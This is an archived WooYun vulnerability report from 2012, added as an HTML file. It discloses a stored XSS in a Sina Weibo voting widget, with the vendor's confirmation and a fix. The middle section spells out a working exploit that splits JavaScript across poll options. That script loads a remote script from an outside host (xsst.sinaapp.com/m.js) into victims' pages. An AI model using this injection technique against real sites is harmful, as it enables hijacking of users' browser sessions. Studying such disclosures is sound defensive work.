@@ -1,0 +1,316 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博某官方应用存储型XSS - 重温一个利用方法～  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博某官方应用存储型XSS - 重温一个利用方法～  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-04 08:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-24：	细节向普通白帽子公开<br/>
+									2012-07-04：	细节向实习白帽子公开<br/>
+									2012-07-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">总的来说，该存储型XSS，是由于某页面的输出没过滤造成的。其实大部分都过滤了，就这里没过滤而已～ 算是小问题啦。 不过在漏洞的利用构造上，个人觉得还是挺有意思的!<br />
+<br />
+在4，5年前，由于QQ空间对用户昵称没过滤，但是QQ昵称的长度又被限制在很短的字符，也没办法插入很多内容，当时我就自己想到了这个方法，然后成功攻击了腾讯官方的QQ空间的留言板（那时候年少无知，马上被和谐了，当时觉得挺有意思的）。在此之后，一直没有再遇到到可以使用这个方法的场景。今天正好在新浪微博某官方应用中碰到了，就分享给大家。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 问题描述<br />
+<br />
+<br />
+<br />
+问题页面：http://vote.weibo.com/widget?vid=1772503<br />
+<br />
+问题原因：图片类型投票时，在投票组件（widget）中，输出图片描述未进行正确的过滤，导致XSS<br />
+<br />
+<br />
+<br />
+2. 问题是小问题，下面才是重点，利用过程。<br />
+<br />
+<br />
+<br />
+2.1 首先查看http://vote.weibo.com/widget?vid=1764421页面的输出内容。<br />
+<br />
+<br />
+<br />
+可以发现，实际可以被注入的地方为 &lt;img title=&quot;{图片描述未过滤}&quot;&gt;&lt;/img&gt;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/040250334142dcb637b949911dfae9d400923b03.jpg" target="_blank"><img src="../images/040250334142dcb637b949911dfae9d400923b03.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2.2 但是图片描述被限定为20个字符，之前Wooyun已经有人提交过选项内容长度没有在服务器端过滤的问题，经测试该问题已经修复，如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04025059b3fae5cdfcebdd1b3d6a49c5b9bbf390.jpg" target="_blank"><img src="../images/04025059b3fae5cdfcebdd1b3d6a49c5b9bbf390.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+如何利用这20个字符插入我们的代码呢？<br />
+<br />
+<br />
+<br />
+首先想到的，还是 &lt;img title=&quot;&quot;onload=&quot;eval(xxxxx)&quot;&gt;&lt;/img&gt;<br />
+<br />
+<br />
+<br />
+其中xxxxx是可控的变量，而且这个变量的长度只能在5之内，经过查找没有我们可控的变量，唯一一个可能被控的$CONFIG$都已经超出长度了。只有eval(name)可以用了！<br />
+<br />
+<br />
+<br />
+2.3 但是eval(name)向来不是我推崇的方式。我们还得想办法！<br />
+<br />
+<br />
+<br />
+这个时候，我第二想到的，就是我若干年前在QQ空间使用过的一个方法。如下：<br />
+<br />
+<br />
+<br />
+因为投票实际上可以写入最多15个投票选项。<br />
+<br />
+<br />
+<br />
+输出的HTML代码大致如下：<br />
+<br />
+<br />
+<br />
+&lt;img title=&quot;[可插入内容]&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;[可插入内容]&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;[可插入内容]&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;[可插入内容]&quot;&gt;&lt;/img&gt;<br />
+<br />
+....(一共15个)<br />
+<br />
+<br />
+<br />
+从而我们可以构造一个比较有意思的利用方式，模型如下：<br />
+<br />
+<br />
+<br />
+&lt;img title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;*/var a=&#039;xxxxxxx&#039;;/*&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;*/var b=&#039;yyyyyyy&#039;;/*&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;*/eval(a+b);/*&quot;&gt;&lt;/img&gt;<br />
+<br />
+&lt;img title=&quot;*/&lt;/script&gt;&lt;b x=&quot;&quot;&gt;&lt;/img&gt;<br />
+<br />
+<br />
+<br />
+2.4 上面的这个模型，会将之间的HTML代码通过/* ..... */ 的方式均变为注释。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04025141df3db20eac39c4314a882845d409f671.jpg" target="_blank"><img src="../images/04025141df3db20eac39c4314a882845d409f671.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2.5 基于以上，我们可以构造以下完整的利用模型，不能超过15个短句，投票数目有限制。其次无法调用新浪网页自带的函数。<br />
+<br />
+<br />
+<br />
+&quot;&gt;&lt;script&gt;/*<br />
+<br />
+*/var l=&#039;\x3C&#039;;/*<br />
+<br />
+*/var n=&#039;\x3E&#039;;/*<br />
+<br />
+*/var b=&#039;xsst.si&#039;;/*<br />
+<br />
+*/var c=&#039;naapp.c&#039;;/*<br />
+<br />
+*/var d=&#039;om/m.js&#039;;/*<br />
+<br />
+*/var e=&#039;script &#039;;/*<br />
+<br />
+*/var f=l+e+&#039;src&#039;;/*<br />
+<br />
+*/var g=l+&#039;/&#039;+e;/*<br />
+<br />
+*/var x=b+c+d;/*<br />
+<br />
+*/var y=f+&#039;=//&#039;+x;/*<br />
+<br />
+*/var z=y+n+g+n;/*<br />
+<br />
+*/var j=document;/*<br />
+<br />
+*/j.write(z);/*<br />
+<br />
+*/&lt;/script&gt;&lt;&quot;<br />
+<br />
+<br />
+<br />
+2.6 然后我们进入投票创建页面：http://vote.weibo.com/create?tab=pic<br />
+<br />
+<br />
+<br />
+一条一条的输入我们构造好的JS代码！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0402521150c7d44dceab12be141683af0596143e.jpg" target="_blank"><img src="../images/0402521150c7d44dceab12be141683af0596143e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2.7 等待投票审核通过后，我们查看投票的widget页面 http://vote.weibo.com/widget?vid=1772503<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/040252377f4636d606288b31ee4f86020641100a.jpg" target="_blank"><img src="../images/040252377f4636d606288b31ee4f86020641100a.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见：http://vote.weibo.com/widget?vid=1772503 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对 http://vote.weibo.com/widget?vid=1772503 里的图片 title属性中的【图片描述】进行输出过滤！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07854" title="新浪微博某官方应用存储型XSS - 重温一个利用方法～">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2012-06-04 09:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供,我们马上处理.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7854";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
